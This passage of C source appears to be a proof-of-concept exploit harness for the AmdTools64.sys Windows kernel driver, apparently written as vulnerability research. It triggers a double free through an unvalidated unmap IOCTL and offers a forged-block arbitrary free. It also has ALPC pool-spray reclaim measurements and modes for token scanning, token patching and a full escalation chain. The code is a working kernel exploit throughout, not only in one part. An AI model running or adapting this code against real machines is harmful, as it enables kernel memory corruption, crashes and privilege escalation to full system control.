        goto alpc_fail;
    }
    /* connect on a watchdog thread: NtAlpcConnectPort blocks until the
     * server receives the connection request; never trust it to return */
    _snwprintf(g_connName, 63, L"%ls", name);
    g_connHandle = NULL; g_connDone = 0;
    hConnThread = CreateThread(NULL, 0, AlpcConnectProc, NULL, 0, NULL);
    if (WaitForSingleObject(g_alpcConnected, 5000) != WAIT_OBJECT_0 ||
        g_connDone == 0) {
        LogW(L"[x] ALPC self-connection did not complete within 5 s "
             L"(status=0x%08x) -- the queue probe needs a connected port; "
             L"no driver calls were sent; reboot the VM if the orphaned "
             L"connect thread wedges the process", g_connStatus);
        rc = 1;
        goto alpc_fail;
    }
    hConn = g_connHandle;
    if (!hConn) {
        LogW(L"[x] NtAlpcConnectPort failed st=0x%08x", g_connStatus);
        rc = 3;
        goto alpc_fail;
    }
    LogW(L"[i] ALPC port connected to itself: %ls", name);
    LogW(L"[i] spraying %u trials: free chunk -> queue 1 message (data "
         L"length %u) -> re-map -> does the message alloc take the chunk?",
         trials, dlen);
    for (t = 0; t < trials; t++) {
        DEVREQ b1, b2;
        UINT8  pdata[0x60];

        ZeroMemory(&b1, sizeof b1); ZeroMemory(&b2, sizeof b2);
        memset(pdata, (int)(0xA0 + (t & 0x0F)), sizeof pdata);
        if (!DevCmdMap(0x1000, 0x1000, 1, &b1)) {
            LogW(L"[x] transport failure at trial %u", t);
            rc = 3;
            goto alpc_fail;
        }
        if (pSendWait(hConn, 0, NULL, NULL, NULL, NULL, NULL, NULL) == 0) {
            /* defensive: should never succeed with a NULL send buffer */
            LogW(L"[x] unexpected receive-return status at trial %u", t);
        }
        {
            ESC_NTSTATUS st = AlpcSendBuf(hConn, pdata, dlen);
            if (st != 0) {
                LogW(L"[x] send failed at trial %u, NTSTATUS=0x%08x "
                     "(queue limit? kernel rejected?) -- aborting spray",
                     t, st);
                DevCmdUnmap(b1.block, NULL);
                rc = 1;
                goto alpc_fail;
            }
        }
        sent++;
        if (DevCmdMap(0x1000, 0x1000, 1, &b2)) {
            if (b2.block == b1.block)
                hit++;
            DevCmdUnmap(b2.block, NULL);
        } else {
            LogW(L"[x] re-map transport failure at trial %u", t);
            rc = 3;
            goto alpc_fail;
        }
        DevCmdUnmap(b1.block, NULL);
    }
    miss = trials - hit;
    LogW(L"[P1] E2 result over %u trials (msg data len %u -> kernel chunk "
         L"~0x28+%u+0x10): %u hits / %u misses", trials, dlen, dlen, hit, miss);
    if (hit == trials)
        LogW(L"[P1] [OK] ALPC message allocations DO land on the freed "
             L"0x30 chunk -- reclaimer candidate (contradicts the header "
             L"size caveat; record for the design doc)");
    else
        LogW(L"[P1] [->] %u misses: expected, the 0x28 PORT_MESSAGE header "
             L"pushes plain messages past the 0x30 bucket. Capture ladder "
             L"(--capture/--s2) remains the primary reclaimer", miss);
alpc_fail:
    if (g_alpcStop) {
        SetEvent(g_alpcStop);
        CloseHandle(g_alpcStop);
    }
    if (hThread)
        CloseHandle(hThread);
    if (hConnThread)
        CloseHandle(hConnThread);   /* watchdog thread may still be blocked in
                                     * the pending connect; process exit owns it */
    /* closing the port frees the whole queue (every live queued message) */
    if (g_alpcPort)
        CloseHandle(g_alpcPort);
    if (hConn)
        CloseHandle(hConn);
    LogW(L"[i] ALPC teardown: port closed, queued messages released "
         L"(%u total sent)", sent);
    return rc;
}

/* Driver Verifier pool-tracking state: the deterministic-proof configuration
 * for this PoC. VerifyDrivers (HKLM\...\Memory Management) lists the drivers
 * under verification; VerifyDriverLevel carries the enabled options. */
static void ReportVerifierState(void)
{
    HKEY h;
    LONG r = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SYSTEM\\CurrentControlSet\\Control\\"
                           L"Session Manager\\Memory Management",
                           0, KEY_QUERY_VALUE, &h);
    if (r != ERROR_SUCCESS) {
        LogW(L"[!] cannot read verifier state (GLE=%ld)", r);
        return;
    }

    wchar_t drivers[1024];
    DWORD type = 0, cb = sizeof(drivers) - sizeof(drivers[0]);
    if (RegQueryValueExW(h, L"VerifyDrivers", NULL, &type,
                         (BYTE *)drivers, &cb) == ERROR_SUCCESS && cb >= sizeof(drivers[0])) {
        drivers[cb / sizeof(drivers[0])] = L'\0';
        LogW(L"[i] Driver Verifier VerifyDrivers: %ls%s",
             drivers[0] ? drivers : L"(nothing under verification)",
             drivers[0] ? L"" : L"");
        if (drivers[0] && wcsstr(drivers, AUDIT_SVC) == NULL &&
            _wcsicmp(drivers, L"amdtools64.sys") != 0) {
            /* value may hold the image base name only */
            LogW(L"[!] AmdTools64.sys NOT in the verifier list: the staged "
                 L"double free may bugcheck with an unspecific 0x50/0xC2/0x19 "
                 L"instead of a verifier-attributable 0xC4");
        }
    } else {
        LogW(L"[i] Driver Verifier VerifyDrivers: not set "
             L"(no special-pool/tracking enabled)");
    }

    DWORD level = 0, cb2 = sizeof(level);
    if (RegQueryValueExW(h, L"VerifyDriverLevel", NULL, &type,
                         (BYTE *)&level, &cb2) == ERROR_SUCCESS)
        LogW(L"[i] VerifyDriverLevel: 0x%08lx%s%s",
             (unsigned long)level,
             (level & 0x1) ? L" special-pool" : L"",        /* VF_SPECIAL_POOLS */
             (level & 0x100) ? L" pool-tracking" : L"");    /* VF_POOL_TRACKING */
    RegCloseKey(h);
}

int wmain(int argc, wchar_t **argv)
{
    /* --s2watch child: dispatch BEFORE any teelog/console plumbing so the
     * capture child stays maximally syscall-light around the fire window;
     * its lines live only in amd_esc_poc.s2watch.proof */
    if (argc >= 5 && !wcscmp(argv[1], L"--s2watch"))
        return HarnessS2Watch((ULONG)wcstoul(argv[2], NULL, 0),
                              ParseU64(argv[3]), ParseU64(argv[4]));

    UINT64 mapPa = 0x1000, forgedBlock = 0, q8 = 0, q16 = 0;
    UINT32 mapLen = 0x1000, ladderN = 100, reclaimN = 100, captureN = 50, agedN = 20, leakN = 5, contigN = 5;
    UINT32 alpcN = 20, alen = 8;
    UINT32 windowN = 5000;       /* --s2window [N]: spray call count */
    UINT8  cache = 1;            /* MmCached */
    BOOL   doInstall = FALSE, doDump = FALSE, doVerify = FALSE;
    BOOL   doNullProbe = FALSE, doForged = FALSE;
    BOOL   doLadder = FALSE, doReclaim = FALSE, doCapture = FALSE, doAged = FALSE, doLeak = FALSE, doContig = FALSE, doS2Live = FALSE;
    BOOL   doAlpc = FALSE, doPaint = FALSE, doS2 = FALSE, doS2Force = FALSE;
    BOOL   doS2Fake = FALSE, doS2Block = FALSE, doS2Window = FALSE, doS2Pool = FALSE;
    BOOL   doPhysLim = FALSE, doS2Scan = FALSE, doS2Token = FALSE;
    BOOL   doMapDiag = FALSE;    /* v4.3.0: preflight only, no chain */
    BOOL   doPfnDb   = FALSE;    /* v5.1.2: benign PFN-db inspector    */
    BOOL   doTokScan = FALSE, doTokMap = FALSE, doTkPatch = FALSE;
    BOOL   doTokDirect = FALSE;   /* v5.1.7: benign direct-locate lookup  */
    BOOL   doGadget0 = FALSE;    /* v5.0.0: P5 modes */
    UINT32 tokN = 2;             /* --s2token [N]: full-chain cycles */
    UINT32 scanN = 3;            /* --s2scan [N]: leak trials */
    unsigned long long t0, t1;

    OpenTeelog();                /* tee all output to amd_esc_poc.log beside the exe */

    for (int i = 1; i < argc; i++) {
        if (!wcscmp(argv[i], L"--pa") && i + 1 < argc)             mapPa = ParseU64(argv[++i]);
        else if (!wcscmp(argv[i], L"--len") && i + 1 < argc)       mapLen = (UINT32)wcstoul(argv[++i], NULL, 0);
        else if (!wcscmp(argv[i], L"--cache") && i + 1 < argc)     cache = (UINT8)wcstoul(argv[++i], NULL, 0);
        else if (!wcscmp(argv[i], L"--block") && i + 1 < argc)     { forgedBlock = ParseU64(argv[++i]); doForged = TRUE; }
        else if (!wcscmp(argv[i], L"--null-probe"))                doNullProbe = TRUE;
        else if (!wcscmp(argv[i], L"--verify-driver"))             doVerify = TRUE;
        else if (!wcscmp(argv[i], L"--dump"))                      doDump = TRUE;
        else if (!wcscmp(argv[i], L"--install"))                   doInstall = TRUE;
        else if (!wcscmp(argv[i], L"--ladder") && i + 1 < argc)    { ladderN = (UINT32)wcstoul(argv[++i], NULL, 0); doLadder = TRUE; }
        else if (!wcscmp(argv[i], L"--reclaim") && i + 1 < argc)   { reclaimN = (UINT32)wcstoul(argv[++i], NULL, 0); doReclaim = TRUE; }
        else if (!wcscmp(argv[i], L"--capture") && i + 1 < argc)   { captureN = (UINT32)wcstoul(argv[++i], NULL, 0); doCapture = TRUE; }
        else if (!wcscmp(argv[i], L"--aged") && i + 1 < argc)      { agedN = (UINT32)wcstoul(argv[++i], NULL, 0); doAged = TRUE; }
        else if (!wcscmp(argv[i], L"--leak") && i + 1 < argc)      { leakN = (UINT32)wcstoul(argv[++i], NULL, 0); doLeak = TRUE; }
        else if (!wcscmp(argv[i], L"--contig") && i + 1 < argc)    { contigN = (UINT32)wcstoul(argv[++i], NULL, 0); doContig = TRUE; }
        else if (!wcscmp(argv[i], L"--s2live"))                   doS2Live = TRUE;
        else if (!wcscmp(argv[i], L"--alpc") && i + 1 < argc)      { alpcN = (UINT32)wcstoul(argv[++i], NULL, 0); doAlpc = TRUE; }
        else if (!wcscmp(argv[i], L"--alen") && i + 1 < argc)      alen = (UINT32)wcstoul(argv[++i], NULL, 0);
        else if (!wcscmp(argv[i], L"--q8") && i + 1 < argc)        q8 = ParseU64(argv[++i]);
        else if (!wcscmp(argv[i], L"--q16") && i + 1 < argc)       q16 = ParseU64(argv[++i]);
        else if (!wcscmp(argv[i], L"--paint"))                     doPaint = TRUE;
        else if (!wcscmp(argv[i], L"--s2"))                        doS2 = TRUE;
        else if (!wcscmp(argv[i], L"--s2fake"))                    doS2Fake = TRUE;
        else if (!wcscmp(argv[i], L"--s2block"))                   doS2Block = TRUE;
        else if (!wcscmp(argv[i], L"--s2pool"))                   doS2Pool = TRUE;
        else if (!wcscmp(argv[i], L"--physlim"))                  doPhysLim = TRUE;
        else if (!wcscmp(argv[i], L"--s2scan") && i + 1 < argc)    { scanN = (UINT32)wcstoul(argv[++i], NULL, 0); doS2Scan = TRUE; }
        else if (!wcscmp(argv[i], L"--s2token")) {
            doS2Token = TRUE;              /* count optional (bare = 2) */
            if (i + 1 < argc && argv[i + 1][0] != L'-')
                tokN = (UINT32)wcstoul(argv[++i], NULL, 0);
        }
        else if (!wcscmp(argv[i], L"--s2window")) {
            doS2Window = TRUE;
            if (i + 1 < argc && argv[i + 1][0] != L'-')
                windowN = (UINT32)wcstoul(argv[++i], NULL, 0);
        }
        else if (!wcscmp(argv[i], L"--s2-force"))                  doS2Force = TRUE;
        else if (!wcscmp(argv[i], L"--mapdiag"))                   doMapDiag = TRUE;
        else if (!wcscmp(argv[i], L"--tokscan"))                   doTokScan = TRUE;
        else if (!wcscmp(argv[i], L"--pfndb"))                     doPfnDb = TRUE;
        else if (!wcscmp(argv[i], L"--tokmap"))                    doTokMap = TRUE;
        else if (!wcscmp(argv[i], L"--tkpatch"))                   doTkPatch = TRUE;
        else if (!wcscmp(argv[i], L"--tokdirect"))                 doTokDirect = TRUE;
        else if (!wcscmp(argv[i], L"--gadget0"))                   doGadget0 = TRUE;
        else { LogW(L"unknown arg %ls\n", argv[i]); return 2; }
    }

    SetConsoleTitleW(TOOL_CON_TITLE);
    PrintBanner();
    t0 = GetTickCount64();
    LogW(L"[i] transport: command = dwIoControlCode (worker sub_140002CB8 @ "
         L"0xFFF028A8); METHOD_BUFFERED in 0x30 / out 0x21 -- no address window needed");

    if (doVerify) {
        Section(L"driver verifier state");
        ReportVerifierState();
        LogW(L"[i] with verifier special/track on, the staged second free "
             L"becomes a deterministic, attributable bugcheck (0x19/0xC4 "
             L"family) naming the freed address");
        LogW(L"[i] --verify-driver is a report-only mode: nothing was sent "
             L"to the driver");
        return 0;
    }

    /* single-shot modes: no map involved, one 0xFFF028A8 with a chosen block */
    if (doNullProbe || doForged) {
        UINT64 target = doNullProbe ? 0 : forgedBlock;

        Section(doNullProbe ? L"null probe (crash on demand)" : L"forged block (arbitrary deref + free)");
        if (doNullProbe)
            LogW(L"[!] block = 0: the worker reads *(NULL+0x08) and *(NULL+0x10); "
                 L"page 0 is unmapped on x64, so a PAGE_FAULT bugcheck is the "
                 L"expected outcome immediately inside this call");
        else
            LogW(L"[!] block = 0x%016llx (attacker-supplied): the worker will "
                 L"read *(B+0x08) and *(B+0x10) (0x140002cce), "
                 L"MmUnmapLockedPages(*(B+0x08), *(B+0x10)), IoFreeMdl, then "
                 L"ExFreePoolWithTag(B, 0) (0x140002cf3)",
                 (unsigned long long)forgedBlock);
        LogW(L"[*] issuing command 0xFFF028A8 --");
        UINT32 st = 0;
        if (DevCmdUnmap(target, &st))
            LogW(L"[+] call returned: driver status = %u (the worker never "
                 L"validates, so 0 was expected even for a forged handle)", st);
        else
            LogW(L"[x] DeviceIoControl failed GLE=%lu", GetLastError());
        LogW(L"[i] if the machine bugchecked during the call, the last lines of "
             L"this log are the crash record");
        CloseHandle(g_dev);
        return 0;
    }

    /* 1. open the device (ACL: SYSTEM + Administrators only) */
    Section(L"device interface");
    if (!OpenDeviceByInterface(&g_dev)) {
        if (!doInstall) {
            LogW(L"[x] no live AmdTools64 device interface: the audit devnode is\n"
                 L"    missing, phantom, or not started. Re-run with --install (or\n"
                 L"    load_amd_servicemode.cmd) to create it through the CM APIs.");
            DiagnoseAuditDevnode();
            return 1;
        }
        LogW(L"[*] --install: kernel service + root devnode through the CM APIs");
        if (!InstallAndStart()) {
            DiagnoseAuditDevnode();
            return 1;
        }
        if (!OpenDeviceWait(&g_dev, 15000)) {
            LogW(L"[x] device interface did not come up after install");
            DiagnoseAuditDevnode();
            return 1;
        }
    }

    /* escalation-harness modes: [P1] measurements then [P2] trigger */
    if (doLadder || doReclaim || doCapture || doAged || doLeak || doContig || doAlpc || doPaint || doS2 || doS2Live || doS2Fake || doS2Block || doS2Window || doS2Pool || doPhysLim || doS2Scan || doS2Token || doMapDiag || doTokScan || doTokMap || doTkPatch || doGadget0 || doPfnDb || doTokDirect) {
        int rc = 0;
        PinCpu0();
        if (doPaint) {
            Section(L"[P1] paint probe (map primitive; content staging only)");
            UINT64 marker[8];
            UINT8  saved[0x40];
            DEVREQ pn;
            UINT32 k;
            marker[0] = q8;
            marker[1] = q16;
            for (k = 2; k < 8; k++)
                marker[k] = 0xCB00000000000000ULL | k;
            if (!PhysPaint(mapPa, marker, 8, saved, &pn))
                rc |= 3;
            else {
                LogW(L"[+] PA 0x%012llx painted: q8=0x%016llx q16=0x%016llx "
                     L"userVa=0x%016llx block=0x%016llx",
                     (unsigned long long)mapPa, (unsigned long long)q8,
                     (unsigned long long)q16, (unsigned long long)pn.userVa,
                     (unsigned long long)pn.block);
                Dump(pn.userVa, 0x40);
                PhysUnpaint(&pn, saved);
            }
        }
        if (doLadder)
            rc |= HarnessLadder(ladderN ? ladderN : 100);
        if (doReclaim)
            rc |= HarnessReclaim(reclaimN ? reclaimN : 100);
        if (doCapture)
            rc |= HarnessCapture(captureN ? captureN : 50);
        if (doAged)
            rc |= HarnessAged(agedN ? agedN : 20);
        if (doLeak)
            rc |= HarnessLeak(leakN ? leakN : 5);
        if (doContig)
            rc |= HarnessContig(contigN ? contigN : 5);
        if (doS2Live)
            rc |= HarnessS2Live();
        if (doS2Block)
            rc |= HarnessS2Block();
        if (doS2Window)
            rc |= HarnessS2Window(windowN);
        if (doS2Pool)
            rc |= HarnessS2Pool();
        if (doPhysLim)
            rc |= HarnessPhysLim();
        if (doS2Scan)
            rc |= HarnessS2Scan(scanN ? scanN : 3);
        if (doMapDiag)
            rc |= HarnessMapDiag();
        if (doPfnDb)
            RunPfnDb();
        if (doTokScan)
            rc |= HarnessTokScan();
        if (doTokMap)
            rc |= HarnessTokMap();
        if (doTokDirect)
            rc |= HarnessTokDirect();
        if (doTkPatch)
            rc |= HarnessTkPatch();
        if (doGadget0)
            rc |= HarnessGadget0();
        if (doS2Token)
            rc |= HarnessS2Token(tokN ? tokN : 2);
        if (doS2Fake)
            rc |= HarnessS2Fake();
        if (doS2Live) {
            /* P2b: parent strictly silent post-fire -- skip the harness-exit
             * banner writes that would pass the poisoned WdFilter path */
            CloseHandle(g_dev);
            return rc;
        }
        if (doAlpc)
            rc |= HarnessAlpc(alpcN ? alpcN : 20, alen);
        if (doS2)
            rc |= HarnessStage2(q8, q16, doS2Force);
        CloseHandle(g_dev);
        t1 = GetTickCount64();
        LogW(L"");
        LogW(L"  +==========================================================+");
        LogW(L"    HARNESS EXIT rc=%d  (run time %llu.%03llu s) -- %ls",
             rc, (t1 - t0) / 1000ULL, (t1 - t0) % 1000ULL,
             rc == 0 ? L"milestones accepted"
                     : L"a milestone failed or was refused -- see [ABORT]/[x] lines");
        LogW(L"  +==========================================================+");
        return rc;
    }

    /* 2. stage 0: obtain a legitimate 'ADIO' block through the map command */
    Section(L"stage 0: obtain a legit 'ADIO' block via 0xFFF028A4");
    DEVREQ req;
    if (!DevCmdMap(mapPa, mapLen, cache, &req)) {
        LogW(L"[x] map DeviceIoControl failed GLE=%lu", GetLastError());
        CloseHandle(g_dev);
        return 1;
    }
    LogW(L"    map ........ PA 0x%012llx, %u bytes, cache %u (%ls)",
         (unsigned long long)mapPa, mapLen, cache, CacheText(cache));
    LogW(L"    status ..... 0x%08x -- %ls", req.status, DevStatusText(req.status));
    LogW(L"    pool block . 0x%016llx  <-- the handle the double free will target",
         (unsigned long long)req.block);
    LogW(L"    user va .... 0x%016llx", (unsigned long long)req.userVa);

    UINT64 block    = req.block;
    UINT64 mappedVa = req.userVa;
    if (mappedVa == 0 || mappedVa >= 0x800000000000ULL || block == 0) {
        LogW(L"[x] map failed (status 0x%x) or no pool block handed back",
             req.status);
        CloseHandle(g_dev);
        return 1;
    }
    if (doDump) {
        LogW(L"[+] mapping is live; first 64 bytes of physical 0x%llx:",
             (unsigned long long)mapPa);
        Dump(mappedVa, (mapLen < 64) ? mapLen : 64);
    }

    /* 3. stage 1: the first unmap is legitimate -- releases user mapping,
     *    MDL and pool block exactly once */
    Section(L"stage 1: first unmap of the handle (legitimate)");
    UINT32 st1 = 0;
    if (!DevCmdUnmap(block, &st1)) {
        LogW(L"[x] first unmap DeviceIoControl failed GLE=%lu -- stop, the "
             L"staged double free would act on a LIVE mapping", GetLastError());
        CloseHandle(g_dev);
        return 1;
    }
    LogW(L"[+] first unmap accepted, driver status = %u -- handle 0x%016llx "
         L"is now fully released: user mapping removed, MDL freed to the "
         L"lookaside list, 'ADIO' block freed",
         st1, (unsigned long long)block);

    /* 4. stage 2: the SECOND unmap of the SAME handle is the bug */
    Section(L"stage 2: second unmap of the SAME handle -- the double free");
    LogW(L"[!] sub_140002CB8 has no consumed-state tracking, so it will act "
         L"on FREED pool memory:");
    LogW(L"    - MmUnmapLockedPages(*(block+0x08), *(block+0x10)) -- the MDL "
         L"was IoFreeMdl'd; its fields are lookaside-recycled garbage");
    LogW(L"    - IoFreeMdl(...)                    -- double free of the MDL");
    LogW(L"    - ExFreePoolWithTag(block, 0)       -- double free of the "
         L"0x20-byte nonpaged block (tag 0 vs 'ADIO')");
    LogW(L"[!] expected outcome on an unaudited kernel: bugcheck during this "
         L"call (0x50/0xA class, or verifier 0xC4). If stage 2's banner is "
         L"the last line of this log after a reboot, stage 2 is the crash site.");
    UINT32 st2 = 0;
    if (DevCmdUnmap(block, &st2))
        LogW(L"[+] DOUBLE FREE ACCEPTED: the second unmap returned, driver "
             L"status = %u -- freed MDL + freed pool block both hit again, "
             L"no error surfaced, pool state silently corrupted",
             st2);
    else
        LogW(L"[x] second unmap DeviceIoControl failed GLE=%lu (the worker "
             L"itself never fails -- a GLE here is a transport artifact)",
             GetLastError());

    CloseHandle(g_dev);

    /* run summary -- reaching it unharmed means the double free was swallowed */
    t1 = GetTickCount64();
    LogW(L"");
    LogW(L"  +==========================================================+");
    LogW(L"    RESULT: staged double free issued on 'ADIO' handle 0x%016llx",
         (unsigned long long)block);
    LogW(L"      stage 1 ... legit unmap, status %u", st1);
    LogW(L"      stage 2 ... same-handle unmap, status %u",
         st2);
    LogW(L"      verdict ... %ls",
         L"SURVIVED -- the driver freed already-freed resources and kept "
         L"running; nonpaged pool state is silently corrupted, so reboot or "
         L"discard the VM before trusting it");
    LogW(L"      proof ..... enable Driver Verifier (special pool / pool "
         L"tracking) for AmdTools64.sys and re-run: stage 2 then triggers a "
         L"deterministic, verifiable bugcheck naming the freed address");
    LogW(L"      run time .. %llu.%03llu s", (t1 - t0) / 1000ULL, (t1 - t0) % 1000ULL);
    LogW(L"  +==========================================================+");
    return 0;
}